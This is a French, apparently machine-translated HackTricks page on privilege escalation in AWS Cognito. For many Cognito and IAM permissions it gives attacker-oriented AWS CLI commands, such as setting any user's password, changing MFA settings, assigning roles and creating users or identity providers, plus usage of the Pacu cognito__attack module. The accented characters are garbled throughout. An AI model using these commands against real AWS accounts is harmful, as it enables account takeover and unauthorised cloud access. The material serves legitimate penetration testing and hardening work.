# AWS - √âl√©vation de privil√®ges Cognito

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cognito

Pour plus d'informations sur Cognito, consultez :

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Collecte de cr√©dentiels √† partir du pool d'identit√©s

Comme Cognito peut accorder des **cr√©dentiels de r√¥le IAM** aux **utilisateurs authentifi√©s** et **non authentifi√©s**, si vous trouvez l'**ID du pool d'identit√©s** d'une application (qui devrait √™tre cod√© en dur dessus), vous pouvez obtenir de nouveaux cr√©dentiels et donc une √©l√©vation de privil√®ges (√† l'int√©rieur d'un compte AWS o√π vous n'aviez probablement m√™me pas de cr√©dential auparavant).

Pour plus d'informations, [**consultez cette page**](../aws-unauthenticated-enum-access/#cognito).

**Impact potentiel :** √âl√©vation de privil√®ges directe vers le r√¥le de services attach√© aux utilisateurs non authentifi√©s (et probablement √† celui attach√© aux utilisateurs authentifi√©s).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Avec cette autorisation, vous pouvez **accorder n'importe quel r√¥le cognito** aux utilisateurs authentifi√©s/non authentifi√©s de l'application Cognito.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Si l'application cognito **n'a pas activ√© les utilisateurs non authentifi√©s**, vous pourriez √©galement avoir besoin de la permission `cognito-identity:UpdateIdentityPool` pour l'activer.

**Impact potentiel :** √âl√©vation de privil√®ges directe vers n'importe quel r√¥le cognito.

### `cognito-identity:update-identity-pool`

Un attaquant avec cette permission pourrait par exemple d√©finir un Pool d'utilisateurs Cognito sous son contr√¥le ou tout autre fournisseur d'identit√© o√π il peut se connecter comme un **moyen d'acc√©der √† ce Pool d'identit√©s Cognito**. Ensuite, simplement **se connecter** sur ce fournisseur d'utilisateurs lui **permettra d'acc√©der au r√¥le authentifi√© configur√© dans le Pool d'identit√©s**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Il est √©galement possible **d'abuser de cette autorisation pour permettre l'authentification de base** :
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Impact potentiel** : Compromettre le r√¥le IAM authentifi√© configur√© √† l'int√©rieur du pool d'identit√©s.

### `cognito-idp:AdminAddUserToGroup`

Cette autorisation permet d'**ajouter un utilisateur Cognito √† un groupe Cognito**, donc un attaquant pourrait abuser de cette autorisation pour ajouter un utilisateur sous son contr√¥le √† d'autres groupes avec des privil√®ges **meilleurs** ou des **r√¥les IAM diff√©rents** :
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Impact potentiel :** √âl√©vation de privil√®ges vers d'autres groupes Cognito et r√¥les IAM attach√©s aux groupes de pools d'utilisateurs.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Un attaquant avec ces autorisations pourrait **cr√©er/mettre √† jour des groupes** avec **chaque r√¥le IAM pouvant √™tre utilis√© par un fournisseur d'identit√© Cognito compromis** et faire en sorte qu'un utilisateur compromis fasse partie du groupe, acc√©dant ainsi √† tous ces r√¥les :

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Impact potentiel :** √âl√©vation de privil√®ges vers d'autres r√¥les IAM Cognito.

### `cognito-idp:AdminConfirmSignUp`

Cette autorisation permet de **v√©rifier une inscription**. Par d√©faut, n'importe qui peut s'inscrire aux applications Cognito. Si cela est laiss√© tel quel, un utilisateur pourrait cr√©er un compte avec n'importe quelles donn√©es et le v√©rifier avec cette autorisation.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Impact potentiel :** √âl√©vation de privil√®ges indirecte vers le r√¥le IAM du pool d'identit√©s pour les utilisateurs authentifi√©s si vous pouvez enregistrer un nouvel utilisateur. √âl√©vation de privil√®ges indirecte vers d'autres fonctionnalit√©s de l'application en √©tant capable de confirmer n'importe quel compte.

### `cognito-idp:AdminCreateUser`

Cette autorisation permettrait √† un attaquant de cr√©er un nouvel utilisateur √† l'int√©rieur du pool d'utilisateurs. Le nouvel utilisateur est cr√©√© comme activ√©, mais devra changer son mot de passe.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Impact potentiel :** √âl√©vation de privil√®ges directe vers le r√¥le IAM du pool d'identit√©s pour les utilisateurs authentifi√©s. √âl√©vation de privil√®ges indirecte vers d'autres fonctionnalit√©s de l'application en pouvant cr√©er n'importe quel utilisateur

### `cognito-idp:AdminEnableUser`

Cette autorisation peut √™tre utile dans un sc√©nario tr√®s particulier o√π un attaquant aurait trouv√© les identifiants d'un utilisateur d√©sactiv√© et aurait besoin de **le r√©activer**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Impact potentiel :** √âl√©vation indirecte des privil√®ges vers le r√¥le IAM du pool d'identit√©s pour les utilisateurs authentifi√©s et les autorisations de l'utilisateur si l'attaquant disposait des identifiants d'un utilisateur d√©sactiv√©.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Cette autorisation permet de se connecter avec la [**m√©thode ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Pour plus d'informations, suivez le lien.

### `cognito-idp:AdminSetUserPassword`

Cette autorisation permettrait √† un attaquant de **changer le mot de passe de n'importe quel utilisateur**, lui permettant d'usurper l'identit√© de cet utilisateur (qui n'a pas activ√© la MFA).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Impact potentiel :** √âl√©vation de privil√®ges directs vers potentiellement n'importe quel utilisateur, donc acc√®s √† tous les groupes dont chaque utilisateur est membre et acc√®s au r√¥le IAM authentifi√© du pool d'identit√©s.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings** : Un attaquant pourrait potentiellement abuser de cette autorisation pour d√©finir un t√©l√©phone portable sous son contr√¥le comme **SMS MFA d'un utilisateur**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference :** Similaire √† la pr√©c√©dente, cette autorisation peut √™tre utilis√©e pour d√©finir les pr√©f√©rences MFA d'un utilisateur afin de contourner la protection MFA.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Similaire √† la pr√©c√©dente, cette autorisation peut √™tre utilis√©e pour d√©finir les pr√©f√©rences MFA d'un pool d'utilisateurs afin de contourner la protection MFA.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Il est √©galement possible de mettre √† jour le pool d'utilisateurs pour modifier la politique MFA. [V√©rifiez le cli ici](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Impact potentiel:** √âl√©vation de privil√®ges indirecte vers potentiellement n'importe quel utilisateur dont l'attaquant conna√Æt les identifiants, ce qui pourrait permettre de contourner la protection MFA.

### `cognito-idp:AdminUpdateUserAttributes`

Un attaquant avec cette autorisation pourrait modifier l'e-mail ou le num√©ro de t√©l√©phone ou tout autre attribut d'un utilisateur sous son contr√¥le pour tenter d'obtenir plus de privil√®ges dans une application sous-jacente.\
Cela permet de modifier un e-mail ou un num√©ro de t√©l√©phone et de le d√©finir comme v√©rifi√©.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Impact potentiel :** Privil√®ge d'escalade indirect potentiel dans l'application sous-jacente en utilisant Cognito User Pool qui accorde des privil√®ges bas√©s sur les attributs de l'utilisateur.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Un attaquant avec cette autorisation pourrait **cr√©er un nouveau Client de Pool d'Utilisateurs moins restreint** que les clients de pool existants. Par exemple, le nouveau client pourrait permettre n'importe quel type de m√©thode d'authentification, ne pas avoir de secret, avoir la r√©vocation de jetons d√©sactiv√©e, permettre aux jetons d'√™tre valides pour une p√©riode plus longue...

La m√™me chose peut √™tre faite si au lieu de cr√©er un nouveau client, un **client existant est modifi√©**.

Dans la [**ligne de commande**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (ou la [**mise √† jour**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) vous pouvez voir toutes les options, v√©rifiez-le !.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Impact potentiel :** Privil√®ge indirect potentiel vers le pool d'identit√©s autoris√© par l'utilisateur utilis√© par le pool d'utilisateurs en cr√©ant un nouveau client qui assouplit les mesures de s√©curit√© et permet √† un attaquant de se connecter avec un utilisateur qu'il a pu cr√©er.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Un attaquant pourrait abuser de cette permission pour cr√©er des utilisateurs en t√©l√©chargeant un fichier csv avec de nouveaux utilisateurs.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**Potentiel Impact :** √âl√©vation de privil√®ges directe vers le r√¥le IAM du pool d'identit√©s pour les utilisateurs authentifi√©s. √âl√©vation de privil√®ges indirecte vers d'autres fonctionnalit√©s de l'application en pouvant cr√©er n'importe quel utilisateur.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Un attaquant pourrait cr√©er un nouveau fournisseur d'identit√© pour ensuite √™tre en mesure de **se connecter via ce fournisseur**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Impact potentiel :** √âl√©vation de privil√®ges directe vers le r√¥le IAM du pool d'identit√©s pour les utilisateurs authentifi√©s. √âl√©vation de privil√®ges indirecte vers d'autres fonctionnalit√©s de l'application en pouvant cr√©er n'importe quel utilisateur.

### Analyse cognito-sync:\*

Il s'agit d'une autorisation tr√®s courante par d√©faut dans les r√¥les des pools d'identit√©s Cognito. M√™me si un joker dans une autorisation semble toujours mauvais (surtout venant d'AWS), les **autorisations donn√©es ne sont pas super utiles d'un point de vue d'un attaquant**.

Cette autorisation permet de lire les informations d'utilisation des pools d'identit√©s et les identifiants d'identit√© √† l'int√©rieur des pools d'identit√©s (qui ne sont pas des informations sensibles).\
Les identifiants d'identit√© peuvent avoir des [**ensembles de donn√©es**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) qui leur sont assign√©s, ce sont des informations sur les sessions (AWS les d√©finit comme un **jeu sauvegard√©**). Il est possible qu'ils contiennent des informations sensibles (mais la probabilit√© est assez faible). Vous pouvez trouver sur la [**page d'√©num√©ration**](../aws-services/aws-cognito-enum/) comment acc√©der √† ces informations.

Un attaquant pourrait √©galement utiliser ces autorisations pour **s'inscrire √† un flux Cognito qui publie des changements** sur ces ensembles de donn√©es ou un **lambda qui se d√©clenche sur des √©v√©nements Cognito**. Je n'ai pas vu cela √™tre utilis√©, et je ne m'attendrais pas √† trouver des informations sensibles ici, mais ce n'est pas impossible.

### Outils automatiques

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), le framework d'exploitation AWS, inclut d√©sormais les modules "cognito\_\_enum" et "cognito\_\_attack" qui automatisent l'√©num√©ration de tous les actifs Cognito dans un compte et signalent les configurations faibles, les attributs utilisateur utilis√©s pour le contr√¥le d'acc√®s, etc., et automatisent √©galement la cr√©ation d'utilisateurs (y compris le support MFA) et l'√©l√©vation de privil√®ges bas√©e sur des attributs personnalis√©s modifiables, des informations d'identit√© utilisables du pool, des r√¥les assumables dans les jetons d'identit√©, etc.

Pour une description des fonctions des modules, consultez la partie 2 du [billet de blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Pour les instructions d'installation, consultez la page principale de [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Utilisation

Exemple d'utilisation de l'attaque cognito\_\_attack pour tenter la cr√©ation d'utilisateur et tous les vecteurs d'√©l√©vation de privil√®ges contre un pool d'identit√©s donn√© et un client de pool d'utilisateurs :
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Exemple d'utilisation de cognito\_\_enum pour rassembler tous les pools d'utilisateurs, clients de pool d'utilisateurs, pools d'identit√©s, utilisateurs, etc. visibles dans le compte AWS actuel :
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) est un outil CLI en python qui impl√©mente diff√©rentes attaques sur Cognito, y compris une √©l√©vation de privil√®ges.

#### Installation
```bash
$ pip install cognito-scanner
```
#### Utilisation
```bash
$ cognito-scanner --help
```
Pour plus d'informations, consultez [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
